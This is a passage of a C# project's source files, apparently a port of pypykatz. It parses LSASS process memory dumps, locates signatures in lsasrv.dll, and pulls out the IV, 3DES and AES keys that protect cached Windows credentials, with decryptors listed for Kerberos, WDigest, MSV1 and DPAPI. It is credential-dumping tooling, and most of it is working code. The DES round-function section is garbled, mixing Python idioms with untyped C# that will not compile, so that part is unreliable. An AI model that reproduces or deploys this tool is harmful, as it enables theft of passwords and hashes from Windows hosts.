            0x00200000,
            0x80002040,
            0x80000040,
            0x80200000,
            0x00202040,
            0x00000000,
            0x00002000,
            0x80000040,
            0x80002040,
            0x80202000,
            0x80200000,
            0x00002040,
            0x00000040,
            0x80200040
        },
        new List<int> {
            0x00004000,
            0x00000200,
            0x01000200,
            0x01000004,
            0x01004204,
            0x00004004,
            0x00004200,
            0x00000000,
            0x01000000,
            0x01000204,
            0x00000204,
            0x01004000,
            0x00000004,
            0x01004200,
            0x01004000,
            0x00000204,
            0x01000204,
            0x00004000,
            0x00004004,
            0x01004204,
            0x00000000,
            0x01000200,
            0x01000004,
            0x00004200,
            0x01004004,
            0x00004204,
            0x01004200,
            0x00000004,
            0x00004204,
            0x01004004,
            0x00000200,
            0x01000000,
            0x00004204,
            0x01004000,
            0x01004004,
            0x00000204,
            0x00004000,
            0x00000200,
            0x01000000,
            0x01004004,
            0x01000204,
            0x00004204,
            0x00004200,
            0x00000000,
            0x00000200,
            0x01000004,
            0x00000004,
            0x01000200,
            0x00000000,
            0x01000204,
            0x01000200,
            0x00004200,
            0x00000204,
            0x00004000,
            0x01004204,
            0x01000000,
            0x01004200,
            0x00000004,
            0x00004004,
            0x01004204,
            0x01000004,
            0x01004200,
            0x01004000,
            0x00004004
        },
        new List<int> {
            0x20800080,
            0x20820000,
            0x00020080,
            0x00000000,
            0x20020000,
            0x00800080,
            0x20800000,
            0x20820080,
            0x00000080,
            0x20000000,
            0x00820000,
            0x00020080,
            0x00820080,
            0x20020080,
            0x20000080,
            0x20800000,
            0x00020000,
            0x00820080,
            0x00800080,
            0x20020000,
            0x20820080,
            0x20000080,
            0x00000000,
            0x00820000,
            0x20000000,
            0x00800000,
            0x20020080,
            0x20800080,
            0x00800000,
            0x00020000,
            0x20820000,
            0x00000080,
            0x00800000,
            0x00020000,
            0x20000080,
            0x20820080,
            0x00020080,
            0x20000000,
            0x00000000,
            0x00820000,
            0x20800080,
            0x20020080,
            0x20020000,
            0x00800080,
            0x20820000,
            0x00000080,
            0x00800080,
            0x20020000,
            0x20820080,
            0x00800000,
            0x20800000,
            0x20000080,
            0x00820000,
            0x00020080,
            0x20020080,
            0x20800000,
            0x00000080,
            0x20820000,
            0x00820080,
            0x00000000,
            0x20000000,
            0x20800080,
            0x00020000,
            0x00820080
        }
    };
    
    public static object F(object L, object R, object keya) {
        var Ta = keya[0] ^ R;
        var Tb = keya[1] ^ R;
        Tb = ror32(Tb, 4);
        L ^= SymCryptDesSpbox[0][(Ta & 0xfc) / 4];
        L ^= SymCryptDesSpbox[1][(Tb & 0xfc) / 4];
        L ^= SymCryptDesSpbox[2][(Ta >> 8 & 0xfc) / 4];
        L ^= SymCryptDesSpbox[3][(Tb >> 8 & 0xfc) / 4];
        L ^= SymCryptDesSpbox[4][(Ta >> 16 & 0xfc) / 4];
        L ^= SymCryptDesSpbox[5][(Tb >> 16 & 0xfc) / 4];
        L ^= SymCryptDesSpbox[6][(Ta >> 24 & 0xfc) / 4];
        L ^= SymCryptDesSpbox[7][(Tb >> 24 & 0xfc) / 4];
        return Tuple.Create(L, R);
    }
    
    public static object rol32(object n, object d) {
        return (n << d | n >> 32 - d) & 0xFFFFFFFF;
    }
    
    public static object ror32(object n, object d) {
        return (n >> d | n << 32 - d) & 0xFFFFFFFF;
    }
    
    public static object xor(object d1, object d2) {
        return bytes(from _tup_1 in zip(d1, d2).Chop((a,b) => (a, b))
            let a = _tup_1.Item1
            let b = _tup_1.Item2
            select a ^ b);
    }
}

```

`Decryptor/lsadecryptor_lsa_decryptor_nt6.cs`:

```cs
using Minidump.Templates;
using System;
using System.Linq;
using System.Runtime.InteropServices;

namespace Minidump.Decryptor
{
    public class LsaDecryptor_NT6
    {
        public static LsaDecryptor.LsaKeys LsaDecryptor(Program.MiniDump minidump, lsaTemplate_NT6.LsaTemplate_NT6 template)
        {
            LsaDecryptor.LsaKeys LsaKeys = new LsaDecryptor.LsaKeys();

            acquire_crypto_material(minidump, template, ref LsaKeys);

            return LsaKeys;
        }

        public static void acquire_crypto_material(Program.MiniDump minidump, lsaTemplate_NT6.LsaTemplate_NT6 template, ref LsaDecryptor.LsaKeys LsaKeys)
        {
            //Console.WriteLine("Acquireing crypto stuff...");

            long sigpos = find_signature(minidump, template);
            minidump.fileBinaryReader.BaseStream.Seek(sigpos, 0);

            LsaKeys.iv = get_IV(minidump, sigpos, template);
            LsaKeys.des_key = get_des_key(minidump, sigpos, template);
            LsaKeys.aes_key = get_aes_key(minidump, sigpos, template);
        }

        public static byte[] get_des_key(Program.MiniDump minidump, long pos, lsaTemplate_NT6.LsaTemplate_NT6 template)
        {
            ///Console.WriteLine("Acquireing DES key...");
            long offset = (pos + template.key_pattern.offset_to_DES_key_ptr);
            long ptr_iv = (long)Helpers.get_ptr_with_offset(minidump.fileBinaryReader, (long)offset, minidump.sysinfo);

            minidump.fileBinaryReader.BaseStream.Seek(ptr_iv, 0);
            ptr_iv = (long)Minidump.Helpers.ReadUInt64(minidump.fileBinaryReader);

            ptr_iv = Helpers.Rva2offset(minidump, ptr_iv);

            minidump.fileBinaryReader.BaseStream.Seek(ptr_iv, 0);

            byte[] h3DesKeyBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY)));
            KIWI_BCRYPT_HANDLE_KEY h3DesKey = Helpers.ReadStruct<KIWI_BCRYPT_HANDLE_KEY>(h3DesKeyBytes);

            byte[] extracted3DesKeyByte = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81)));
            KIWI_BCRYPT_KEY81 extracted3DesKey = Helpers.ReadStruct<KIWI_BCRYPT_KEY81>(extracted3DesKeyByte);

            return extracted3DesKey.hardkey.data.Take(24).ToArray();
        }

        public static byte[] get_aes_key(Program.MiniDump minidump, long pos, lsaTemplate_NT6.LsaTemplate_NT6 template)
        {
            //Console.WriteLine("Acquireing AES key...");
            long offset = (pos + template.key_pattern.offset_to_AES_key_ptr);
            long ptr_iv = (long)Helpers.get_ptr_with_offset(minidump.fileBinaryReader, (long)offset, minidump.sysinfo);

            minidump.fileBinaryReader.BaseStream.Seek(ptr_iv, 0);
            ptr_iv = (long)Helpers.ReadUInt64(minidump.fileBinaryReader);
            ptr_iv = Helpers.Rva2offset(minidump, ptr_iv);

            minidump.fileBinaryReader.BaseStream.Seek(ptr_iv, 0);

            byte[] hAesKeyBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY)));
            KIWI_BCRYPT_HANDLE_KEY hAesKey = Helpers.ReadStruct<KIWI_BCRYPT_HANDLE_KEY>(hAesKeyBytes);

            ptr_iv = Helpers.Rva2offset(minidump, hAesKey.key);
            minidump.fileBinaryReader.BaseStream.Seek(ptr_iv, 0);
            byte[] extractedAesKeyBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81)));
            KIWI_BCRYPT_KEY81 extractedAesKey = Helpers.ReadStruct<KIWI_BCRYPT_KEY81>(extractedAesKeyBytes);

            return extractedAesKey.hardkey.data.Take(16).ToArray();
        }

        public static long find_signature(Program.MiniDump minidump, lsaTemplate_NT6.LsaTemplate_NT6 template)
        {
            //Console.WriteLine("Looking for main struct signature in memory...");
            long fl = Helpers.find_in_module(minidump, "lsasrv.dll", template.key_pattern.signature);
            if (fl == 0)
            {
                throw new Exception("LSA signature not found!");
            }
            return fl;
        }

        public static byte[] get_IV(Program.MiniDump minidump, long pos, lsaTemplate_NT6.LsaTemplate_NT6 template)
        {
            //Console.WriteLine("Reading IV");
            long offset = (pos + template.key_pattern.offset_to_IV_ptr);

            long ptr_iv = (long)Helpers.get_ptr_with_offset(minidump.fileBinaryReader, (long)offset, minidump.sysinfo);

            minidump.fileBinaryReader.BaseStream.Seek(ptr_iv, 0);
            byte[] data = minidump.fileBinaryReader.ReadBytes(template.key_pattern.IV_length);

            return data.Take(16).ToArray();
        }
    }
}
```

`Helpers.cs`:

```cs
using Minidump.Streams;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Minidump
{
    public class Helpers
    {
        public const int LM_NTLM_HASH_LENGTH = 16;
        public const int SHA_DIGEST_LENGTH = 20;

        [StructLayout(LayoutKind.Sequential)]
        public struct LARGE_INTEGER
        {
            public int LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public long Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool ConvertSidToStringSid(
            [MarshalAs(UnmanagedType.LPArray)] byte[] pSID, out IntPtr ptrSid);

        public static DateTime ToDateTime(FILETIME time)
        {
            var fileTime = ((long)time.dwHighDateTime << 32) | (uint)time.dwLowDateTime;

            try
            {
                return DateTime.FromFileTime(fileTime);
            }
            catch
            {
                return DateTime.FromFileTime(0xFFFFFFFF);
            }
        }

        public static List<long> find_all_global(BinaryReader fileBinaryReader, byte[] pattern, byte[] allocationprotect = null)
        {
            List<long> list = new List<long>();
            if (allocationprotect == null)
                allocationprotect = new byte[] { 0x04 };

            fileBinaryReader.BaseStream.Seek(0, 0);
            byte[] data = fileBinaryReader.ReadBytes((int)fileBinaryReader.BaseStream.Length);
            list = AllPatternAt(data, pattern);
            return list;
        }

        //https://github.com/skelsec/pypykatz/blob/bd1054d1aa948133a697a1dfcb57a5c6463be41a/pypykatz/lsadecryptor/package_commons.py#L64
        public static long find_signature(Program.MiniDump minidump, string module_name, byte[] signature)
        {
            return find_in_module(minidump, module_name, signature);
        }

        //https://github.com/skelsec/minidump/blob/96d6b64dba679df14f5f78c64c3a045be8c4f1f1/minidump/minidumpreader.py#L268
        public static long find_in_module(Program.MiniDump minidump, string module_name, byte[] pattern, bool find_first = false, bool reverse = false)
        {
            return search_module(minidump, module_name, pattern, find_first = find_first, reverse = reverse);
        }

        //https://github.com/skelsec/minidump/blob/96d6b64dba679df14f5f78c64c3a045be8c4f1f1/minidump/minidumpreader.py#L323
        public static long search_module(Program.MiniDump minidump, string module_name, byte[] pattern, bool find_first = false, bool reverse = false, int chunksize = (10 * 1024))
        {
            long pos = minidump.fileBinaryReader.BaseStream.Position;
            ModuleList.MinidumpModule mod = get_module_by_name(module_name, minidump.modules);
            List<MinidumpMemory.MinidumpMemorySegment> memory_segments = new List<MinidumpMemory.MinidumpMemorySegment>();
            bool is_fulldump;
            if (minidump.sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                memory_segments = minidump.memory_segments_64.memory_segments;
                is_fulldump = true;
            }
            else
            {
                memory_segments = minidump.memory_segments.memory_segments;
                is_fulldump = false;
            }

            byte[] needles = new byte[] { };
            foreach (MinidumpMemory.MinidumpMemorySegment ms in memory_segments)
            {
                if (mod.baseaddress <= ms.start_virtual_address && ms.start_virtual_address <= mod.endaddress)
                {
                    minidump.fileBinaryReader.BaseStream.Seek(ms.start_file_address, 0);
                    byte[] data = minidump.fileBinaryReader.ReadBytes((int)ms.size);
                    minidump.fileBinaryReader.BaseStream.Seek(pos, 0);
                    int offset = PatternAt(data, pattern);
                    if (offset != -1)
                    {
                        return (ms.start_file_address + offset);
                    }
                }
            }

            return 0;
        }

        public static long Rva2offset(Program.MiniDump minidump, long virutal_address)
        {
            List<MinidumpMemory.MinidumpMemorySegment> memory_segments = new List<MinidumpMemory.MinidumpMemorySegment>();
            bool is_fulldump;
            if (minidump.sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                memory_segments = minidump.memory_segments_64.memory_segments;
                is_fulldump = true;
            }
            else
            {
                memory_segments = minidump.memory_segments.memory_segments;
                is_fulldump = false;
            }

            foreach (MinidumpMemory.MinidumpMemorySegment ms in memory_segments)
            {
                if (ms.start_virtual_address <= (long)virutal_address && ms.end_virtual_address >= (long)virutal_address)
                {
                    if (ms.start_virtual_address < (long)virutal_address)
                    {
                        int offset = (int)(virutal_address - (long)ms.start_virtual_address);
                        return (long)(ms.start_file_address + (long)offset);
                    }
                    return (long)ms.start_file_address;
                }
            }

            return 0;
        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("0x{0:x2} ", b);
            return hex.ToString();
        }

        public static int PatternAt(byte[] src, byte[] pattern)
        {
            int maxFirstCharSlot = src.Length - pattern.Length + 1;
            for (int i = 0; i < maxFirstCharSlot; i++)
            {
                if (src[i] != pattern[0]) // compare only first byte
                    continue;

                // found a match on first byte, now try to match rest of the pattern
                for (int j = pattern.Length - 1; j >= 1; j--)
                {
                    if (src[i + j] != pattern[j]) break;
                    if (j == 1) return i;
                }
            }
            return -1;
        }

        public static List<long> AllPatternAt(byte[] src, byte[] pattern)
        {
            List<long> list = new List<long>();
            int maxFirstCharSlot = src.Length - pattern.Length + 1;
            for (int i = 0; i < maxFirstCharSlot; i++)
            {
                if (src[i] != pattern[0]) // compare only first byte
                    continue;

                // found a match on first byte, now try to match rest of the pattern
                for (int j = pattern.Length - 1; j >= 1; j--)
                {
                    if (src[i + j] != pattern[j]) break;
                    if (j == 1) list.Add(i);
                }
            }
            return list;
        }

        //https://github.com/skelsec/minidump/blob/96d6b64dba679df14f5f78c64c3a045be8c4f1f1/minidump/minidumpreader.py#L311
        public static ModuleList.MinidumpModule get_module_by_name(string module_name, List<ModuleList.MinidumpModule> modules)
        {
            return modules.FirstOrDefault(item => item.name.Contains(module_name));
        }

        //https://github.com/skelsec/pypykatz/blob/bd1054d1aa948133a697a1dfcb57a5c6463be41a/pypykatz/commons/common.py#L168
        public static ulong get_ptr_with_offset(BinaryReader fileBinaryReader, long pos, SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                fileBinaryReader.BaseStream.Seek(pos, SeekOrigin.Begin);
                UInt32 ptr = Minidump.Helpers.ReadUInt32(fileBinaryReader);
                return (ulong)(pos + 4 + ptr);
            }
            else
            {
                fileBinaryReader.BaseStream.Seek(pos, SeekOrigin.Begin);
                UInt16 ptr = Minidump.Helpers.ReadUInt16(fileBinaryReader);
                return ptr;
            }
        }

        //https://github.com/skelsec/pypykatz/blob/bd1054d1aa948133a697a1dfcb57a5c6463be41a/pypykatz/commons/common.py#L162
        public static ulong get_ptr(BinaryReader fileBinaryReader, long pos, SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            fileBinaryReader.BaseStream.Seek(pos, 0);
            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                UInt32 ptr = Minidump.Helpers.ReadUInt32(fileBinaryReader);
                return (ulong)ptr;
            }
            else
            {
                UInt16 ptr = Minidump.Helpers.ReadUInt16(fileBinaryReader);
                return (ulong)ptr;
            }
        }

        public static T ReadStruct<T>(byte[] array) where T : struct
        {
            var handle = GCHandle.Alloc(array, GCHandleType.Pinned);
            var mystruct = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return mystruct;
        }

        public static string ExtractSid(Program.MiniDump minidump, long pSid)
        {
            byte nbAuth;
            int sizeSid;

            var pSidInt = Minidump.Helpers.ReadInt64(minidump.fileBinaryReader, pSid);
            minidump.fileBinaryReader.BaseStream.Seek(Rva2offset(minidump, pSidInt) + 8, 0);
            var nbAuth_b = minidump.fileBinaryReader.ReadBytes(1);
            nbAuth = nbAuth_b[0];
            sizeSid = 4 * nbAuth + 6 + 1 + 1;

            minidump.fileBinaryReader.BaseStream.Seek(Rva2offset(minidump, pSidInt), 0);
            var sid_b = minidump.fileBinaryReader.ReadBytes(sizeSid);

            ConvertSidToStringSid(sid_b, out IntPtr ptrSid);

            return Marshal.PtrToStringAuto(ptrSid);
        }

        public static UNICODE_STRING ExtractUnicodeString(BinaryReader fileStreamReader)
        {
            UNICODE_STRING str;

            byte[] strBytes = fileStreamReader.ReadBytes(Marshal.SizeOf(typeof(UNICODE_STRING)));
            str = ReadStruct<UNICODE_STRING>(strBytes);

            return str;
        }

        public static string ExtractUnicodeStringString(Program.MiniDump minidump, UNICODE_STRING str)
        {
            if (str.MaximumLength == 0) return null;

            minidump.fileBinaryReader.BaseStream.Seek(Helpers.Rva2offset(minidump, str.Buffer), 0);
            byte[] resultBytes = minidump.fileBinaryReader.ReadBytes(str.MaximumLength);

            var encoder = new UnicodeEncoding(false, false, true);
            try
            {
                return encoder.GetString(resultBytes);
            }
            catch (Exception)
            {
                return PrintHexBytes(resultBytes);
            }
        }

        public static string PrintHexBytes(byte[] byteArray)
        {
            var res = new StringBuilder(byteArray.Length * 3);
            for (var i = 0; i < byteArray.Length; i++)
                res.AppendFormat(NumberFormatInfo.InvariantInfo, "{0:x2} ", byteArray[i]);
            return res.ToString();
        }

        public static int FieldOffset<T>(string fieldName)
        {
            return Marshal.OffsetOf(typeof(T), fieldName).ToInt32();
        }

        public static int StructFieldOffset(Type s, string field)
        {
            var ex = typeof(Helpers);
            var mi = ex.GetMethod("FieldOffset");
            var miConstructed = mi.MakeGenericMethod(s);
            object[] args = { field };
            return (int)miConstructed.Invoke(null, args);
        }

        public static UNICODE_STRING ExtractUnicodeString(BinaryReader fileStreamReader, long offset)
        {
            UNICODE_STRING str;
            fileStreamReader.BaseStream.Seek(offset, 0);
            byte[] strBytes = fileStreamReader.ReadBytes(Marshal.SizeOf(typeof(UNICODE_STRING)));
            str = ReadStruct<UNICODE_STRING>(strBytes);

            return str;
        }

        public static byte[] GetBytes(byte[] source, long startindex, int lenght)
        {
            var resBytes = new byte[lenght];
            Array.Copy(source, startindex, resBytes, 0, resBytes.Length);
            return resBytes;
        }

        public static string PrintHashBytes(byte[] byteArray)
        {
            if (byteArray == null)
                return string.Empty;

            var res = new StringBuilder(byteArray.Length * 2);
            for (var i = 0; i < byteArray.Length; i++)
                res.AppendFormat(NumberFormatInfo.InvariantInfo, "{0:x2}", byteArray[i]);
            return res.ToString();
        }

        public static string ExtractANSIStringString(Program.MiniDump minidump, UNICODE_STRING str)
        {
            if (str.MaximumLength == 0) return null;

            minidump.fileBinaryReader.BaseStream.Seek(Helpers.Rva2offset(minidump, str.Buffer), 0);
            byte[] resultBytes = minidump.fileBinaryReader.ReadBytes(str.MaximumLength);
            var pinnedArray = GCHandle.Alloc(resultBytes, GCHandleType.Pinned);
            var tmp_p = pinnedArray.AddrOfPinnedObject();
            var result = Marshal.PtrToStringAnsi(tmp_p);
            pinnedArray.Free();

            return result;
        }

        public static string get_from_rva(int rva, BinaryReader fileBinaryReader)
        {
            long pos = fileBinaryReader.BaseStream.Position;
            fileBinaryReader.BaseStream.Seek(rva, 0);
            UInt32 length = ReadUInt32(fileBinaryReader);
            byte[] data = fileBinaryReader.ReadBytes((int)length);
            ////Array.Reverse(data);
            fileBinaryReader.BaseStream.Seek(pos, 0);
            string name = Encoding.Unicode.GetString(data);
            return name;
        }

        public static void PrintProperties(object myObj, string header = "", int offset = 0)
        {
            string trail = String.Concat(Enumerable.Repeat(" ", offset));

            if (!string.IsNullOrEmpty(header))
                Console.WriteLine(header);

            foreach (var prop in myObj.GetType().GetProperties())
            {
                try
                {
                    if (!string.IsNullOrEmpty((string)(prop.GetValue(myObj, null))))
                        Console.WriteLine(trail + prop.Name + ": " + prop.GetValue(myObj, null));
                }
                catch (Exception e)
                {
                    Console.WriteLine(trail + prop.Name + ": " + prop.GetValue(myObj, null));
                }
            }

            foreach (var field in myObj.GetType().GetFields())
            {
                try
                {
                    if (!string.IsNullOrEmpty((string)field.GetValue(myObj)))
                        Console.WriteLine(trail + field.Name + ": " + field.GetValue(myObj));
                }
                catch (Exception e)
                {
                    Console.WriteLine(trail + field.Name + ": " + field.GetValue(myObj));
                }
            }
        }

        public static string ReadString(BinaryReader fileBinaryReader, int Length)
        {
            var data = fileBinaryReader.ReadBytes(Length);
            Array.Reverse(data);
            return Encoding.Unicode.GetString(data);
        }

        public static Int16 ReadInt16(BinaryReader fileBinaryReader)
        {
            var data = fileBinaryReader.ReadBytes(2);
            //Array.Reverse(data);
            return BitConverter.ToInt16(data, 0);
        }

        public static Int32 ReadInt32(BinaryReader fileBinaryReader)
        {
            var data = fileBinaryReader.ReadBytes(4);
            //Array.Reverse(data);
            return BitConverter.ToInt32(data, 0);
        }

        public static Int64 ReadInt64(BinaryReader fileBinaryReader)
        {
            var data = fileBinaryReader.ReadBytes(8);
            //Array.Reverse(data);
            return BitConverter.ToInt64(data, 0);
        }

        public static uint ReadInt8(BinaryReader fileBinaryReader)
        {
            byte data = fileBinaryReader.ReadBytes(1)[0];
            //Array.Reverse(data);
            return data;
        }

        public static UInt16 ReadUInt16(BinaryReader fileBinaryReader)
        {
            var data = fileBinaryReader.ReadBytes(2);
            //Array.Reverse(data);
            return BitConverter.ToUInt16(data, 0);
        }

        public static UInt32 ReadUInt32(BinaryReader fileBinaryReader)
        {
            var data = fileBinaryReader.ReadBytes(4);
            //Array.Reverse(data);
            return BitConverter.ToUInt32(data, 0);
        }

        public static UInt64 ReadUInt64(BinaryReader fileBinaryReader)
        {
            var data = fileBinaryReader.ReadBytes(8);
            //Array.Reverse(data);
            return BitConverter.ToUInt64(data, 0);
        }

        public static Int16 ReadInt16(BinaryReader fileBinaryReader, long offset)
        {
            fileBinaryReader.BaseStream.Seek(offset, 0);
            var data = fileBinaryReader.ReadBytes(2);
            //Array.Reverse(data);
            return BitConverter.ToInt16(data, 0);
        }

        public static Int32 ReadInt32(BinaryReader fileBinaryReader, long offset)
        {
            fileBinaryReader.BaseStream.Seek(offset, 0);
            var data = fileBinaryReader.ReadBytes(4);
            //Array.Reverse(data);
            return BitConverter.ToInt32(data, 0);
        }

        public static Int64 ReadInt64(BinaryReader fileBinaryReader, long offset)
        {
            fileBinaryReader.BaseStream.Seek(offset, 0);
            var data = fileBinaryReader.ReadBytes(8);
            //Array.Reverse(data);
            return BitConverter.ToInt64(data, 0);
        }

        public static uint ReadInt8(BinaryReader fileBinaryReader, long offset)
        {
            fileBinaryReader.BaseStream.Seek(offset, 0);
            byte data = fileBinaryReader.ReadBytes(1)[0];
            //Array.Reverse(data);
            return data;
        }

        public static UInt16 ReadUInt16(BinaryReader fileBinaryReader, long offset)
        {
            fileBinaryReader.BaseStream.Seek(offset, 0);
            var data = fileBinaryReader.ReadBytes(2);
            //Array.Reverse(data);
            return BitConverter.ToUInt16(data, 0);
        }

        public static UInt32 ReadUInt32(BinaryReader fileBinaryReader, long offset)
        {
            fileBinaryReader.BaseStream.Seek(offset, 0);
            var data = fileBinaryReader.ReadBytes(4);
            //Array.Reverse(data);
            return BitConverter.ToUInt32(data, 0);
        }

        public static UInt64 ReadUInt64(BinaryReader fileBinaryReader, long offset)
        {
            fileBinaryReader.BaseStream.Seek(offset, 0);
            var data = fileBinaryReader.ReadBytes(8);
            //Array.Reverse(data);
            return BitConverter.ToUInt64(data, 0);
        }

        public static byte[] ReadBytes(BinaryReader fileBinaryReader, long offset, int length)
        {
            fileBinaryReader.BaseStream.Seek(offset, 0);
            var data = fileBinaryReader.ReadBytes(length);
            //Array.Reverse(data);
            return data;
        }
    }
}
```

`Minidump.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{BA1F3992-9654-4424-A0CC-26158FDFBF74}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <RootNamespace>Minidump</RootNamespace>
    <AssemblyName>Minidump</AssemblyName>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <Deterministic>true</Deterministic>
    <PublishUrl>publish\</PublishUrl>
    <Install>true</Install>
    <InstallFrom>Disk</InstallFrom>
    <UpdateEnabled>false</UpdateEnabled>
    <UpdateMode>Foreground</UpdateMode>
    <UpdateInterval>7</UpdateInterval>
    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
    <UpdatePeriodically>false</UpdatePeriodically>
    <UpdateRequired>false</UpdateRequired>
    <MapFileExtensions>true</MapFileExtensions>
    <ApplicationRevision>0</ApplicationRevision>
    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
    <IsWebBootstrapper>false</IsWebBootstrapper>
    <UseApplicationTrust>false</UseApplicationTrust>
    <BootstrapperEnabled>true</BootstrapperEnabled>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
    <Prefer32Bit>false</Prefer32Bit>
  </PropertyGroup>
  <PropertyGroup>
    <NoWin32Manifest>true</NoWin32Manifest>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Net.Http" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Crypto\BCrypt.cs" />
    <Compile Include="Crypto\Crypto.cs" />
    <Compile Include="Decryptor\Cloudap_.cs" />
    <Compile Include="Decryptor\Credman.cs" />
    <Compile Include="Decryptor\Dpapi_.cs" />
    <Compile Include="Decryptor\Kerberos_.cs" />
    <Compile Include="Decryptor\KerberosSessions.cs" />
    <Compile Include="Decryptor\Ssp_.cs" />
    <Compile Include="Decryptor\Tspkg_.cs" />
    <Compile Include="Decryptor\WDigest_.cs" />
    <Compile Include="Templates\cloudap_templates.cs" />
    <Compile Include="Templates\credman_templates.cs" />
    <Compile Include="Templates\dpapi_templates.cs" />
    <Compile Include="Templates\kerberos_templates.cs" />
    <Compile Include="Templates\tspkg_templates.cs" />
    <Compile Include="Templates\wdigest_templates.cs" />
    <Compile Include="Decryptor\LogonSessions.cs" />
    <Compile Include="Decryptor\lsadecryptor_lsa_decryptor.cs" />
    <Compile Include="Decryptor\lsadecryptor_lsa_decryptor_nt6.cs" />
    <Compile Include="Decryptor\Msv1_.cs" />
    <Compile Include="Streams\Directory.cs" />
    <Compile Include="Streams\Header.cs" />
    <Compile Include="Helpers.cs" />
    <Compile Include="Streams\Parse.cs" />
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <Compile Include="Streams\Memory64ListStream.cs" />
    <Compile Include="Streams\Memory86ListStream.cs" />
    <Compile Include="Streams\ModuleList.cs" />
    <Compile Include="Streams\MinidumpMemory.cs" />
    <Compile Include="Streams\SystemInfo.cs" />
    <Compile Include="Templates\lsa_templates.cs" />
    <Compile Include="Templates\lsa_template_nt6.cs" />
    <Compile Include="Templates\msv_templates.cs" />
    <Compile Include="Templates\ssp_templates.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config" />
  </ItemGroup>
  <ItemGroup>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
  </ItemGroup>
  <ItemGroup />
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
</Project>
```

`Minidump.csproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <ProjectView>ProjectFiles</ProjectView>
    <PublishUrlHistory>publish\</PublishUrlHistory>
    <InstallUrlHistory />
    <SupportUrlHistory />
    <UpdateUrlHistory />
    <BootstrapperUrlHistory />
    <ErrorReportUrlHistory />
    <FallbackCulture>en-US</FallbackCulture>
    <VerifyUploadedFiles>false</VerifyUploadedFiles>
  </PropertyGroup>
</Project>
```

`Minidump.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.31424.327
MinimumVisualStudioVersion = 10.0.40219.1
